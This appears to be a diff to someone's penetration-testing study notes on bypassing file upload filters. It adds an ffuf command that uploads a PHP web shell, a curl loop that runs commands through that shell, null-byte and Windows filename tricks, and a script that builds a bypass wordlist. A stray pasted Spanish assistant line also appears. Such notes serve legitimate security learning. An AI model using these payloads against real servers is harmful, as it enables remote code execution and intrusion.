@@ -1,5 +1,7 @@
 A **file upload attack** involves uploading a malicious file to a server, often to execute arbitrary code or gain unauthorized access.
 
+---
+
 ## Double Extension Attack
 A **double extension** attack involves uploading a file with two extensions, such as `file.php.jpg`, `file.php5`, or `file.php.png`. The first extension (e.g., `.php`) represents the file type that will be executed by the server, while the second extension (e.g., `.jpg` or `.png`) is typically used to make the file appear as a harmless image, bypassing the filter
 
@@ -22,7 +24,6 @@ After uploading the file, access it by navigating to its URL. The  code inside t
 
 
 ---
-
 
 
 ## Changing File Extensions and Renaming Files
@@ -49,7 +50,26 @@ By doing this, the malicious file might bypass the server's validation system, w
 | `zip`                  | `tar, gz, tgz, rar, 7z`         |
 | `png`                  | `jpg, jpeg, bmp, gif, tiff`     |
 | `xml`                  | `xhtml, html, rdf, json`        |
+We can also use **ffuf** to test which extensions are accepted by the server:
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt:FUZZ -X POST \
+-u http://<target>/upload.php \
+-H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySJ86OHGBIWOifQiC" \
+-d $'------WebKitFormBoundarySJ86OHGBIWOifQiC\r
+Content-Disposition: form-data; name="uploadFile"; filename="shell.FUZZ"\r
+Content-Type: image/png\r
+\r
+<?php system($_GET["cmd"]); ?>\r
+------WebKitFormBoundarySJ86OHGBIWOifQiC--\r' \
+-fs 0
+```
 
+If too many results appear as valid, besides adjusting filters, save the "valid" extensions and execute a fuzzing attack testing the execution.
+```bash
+for ext in $(cat valid_ext.txt); do
+  curl "http://<target>/uploads/shell.$ext.jpg?cmd=id"
+done
+```
 
 ---
 
@@ -136,3 +156,65 @@ Now, if Nginx is misconfigured and allows execution of PHP files in subdirectori
 http://example.com/uploads/rev.png/rev.php?cmd=whoami
 ```
 
+Aquí tienes la sección adaptada a tu formato de apuntes, clara y directa:
+
+---
+
+## Character Injection
+
+Some applications validate file uploads by checking the extension, but they may misinterpret filenames if special characters are injected.
+
+By adding specific characters before or after the extension, we can trick the server into **bypassing the whitelist** and executing the file as PHP.
+
+### Common Characters
+
+```bash
+%20
+%0a
+%00
+%0d0a
+/
+.\
+.
+…
+:
+```
+
+Each character can affect how the filename is parsed.
+
+#### Examples
+
+- **Null byte (old PHP versions):**
+    
+
+```bash
+shell.php%00.jpg
+```
+
+The server stops at `%00` → saved as `shell.php`
+
+- **Windows bypass:**
+    
+
+```bash
+shell.aspx:.jpg
+```
+
+The file may be interpreted as `shell.aspx`
+
+### Fuzzing Filenames
+
+We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the `PHP` and `JPG` extensions, as follows:
+
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
+
+This wordlist can be used to bypass the whitelist test and execute PHP code.
